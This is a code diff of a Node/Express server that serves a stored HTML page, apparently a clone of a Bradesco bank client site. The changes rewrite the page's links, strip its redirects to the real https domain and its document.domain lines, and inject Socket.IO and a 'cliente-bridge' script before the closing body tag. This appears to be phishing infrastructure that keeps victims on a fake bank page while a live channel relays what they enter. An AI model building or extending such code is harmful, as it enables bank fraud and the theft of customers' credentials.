@@ -177,7 +177,7 @@ async function startServer() {
     let html = fs.readFileSync(htmlPath, "utf-8");
 
     // Reescrever URLs relativas para caminhos absolutos baseados em /cliente-static/
-    html = html.replace(/(href|src)="(?!https?:|\/\/|\/cliente-static|javascript:|#|data:)([^"]+)")/g, (_m, attr, url) => {
+    html = html.replace(/(href|src)="(?!https?:|\/\/|\/cliente-static|javascript:|#|data:)([^"]+)"/g, (_m, attr, url) => {
       const cleanUrl = url.startsWith("/") ? url : `/${url}`;
       return `${attr}="/cliente-static${cleanUrl}"`;
     });
@@ -186,18 +186,13 @@ async function startServer() {
     html = html.replace(/document\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "/* removido */");
     html = html.replace(/document\.domain\s*=\s*['"][^'"]+['"];?/g, "/* removido */");
 
-    // Injetar Socket.IO e Wrapper no topo do head para garantir carregamento prioritário
+    // Injetar Socket.IO e Bridge com caminhos absolutos
     const inject = `
 <link rel="stylesheet" href="/cliente-static/__bridge__/cliente-bridge.css">
 <script src="/socket.io/socket.io.js"></script>
-<script src="/cliente-static/__bridge__/wrapper.js"></script>
+<script src="/cliente-static/__bridge__/cliente-bridge.js"></script>
 `;
-    // Injeção ultra-agressiva para garantir que apareça no navegador
-    if (html.toLowerCase().includes('<head>')) {
-      html = html.replace(/<head>/i, `<head>${inject}`);
-    } else {
-      html = `${inject}${html}`;
-    }
+    html = html.replace(/<\/body>/i, `${inject}</body>`);
     res.set("Content-Type", "text/html; charset=utf-8");
     res.send(html);
   };
@@ -324,12 +319,9 @@ async function startServer() {
     serveStatic(app);
   }
 
-  // Rota de Health Check para o Railway
-  app.get('/health', (req, res) => res.status(200).send('OK'));
-
-  const port = Number(process.env.PORT) || 3000;
+  const port = parseInt(process.env.PORT || "3000");
   server.listen(port, "0.0.0.0", () => {
-    console.log(`[SERVER] Bradesco System online on port ${port}`);
+    console.log(`Server running on port ${port}`);
   });
 }
 
